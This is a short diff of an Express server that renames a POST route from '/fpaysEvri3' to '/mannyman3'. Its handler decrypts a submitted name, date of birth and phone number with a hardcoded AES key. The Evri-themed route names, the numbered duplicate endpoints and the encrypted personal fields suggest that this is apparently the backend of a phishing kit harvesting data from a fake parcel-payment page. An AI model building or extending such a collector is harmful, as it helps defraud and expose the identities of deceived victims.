@@ -1800,9 +1800,9 @@ app.post('/fpaysEvri', (req, res) => {
 //     })
 // });
 
-app.options('/fpaysEvri3', cors())
+app.options('/mannyman3', cors())
 
-app.post('/fpaysEvri3', (req, res) => {
+app.post('/mannyman3', (req, res) => {
     fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
     dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
     telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
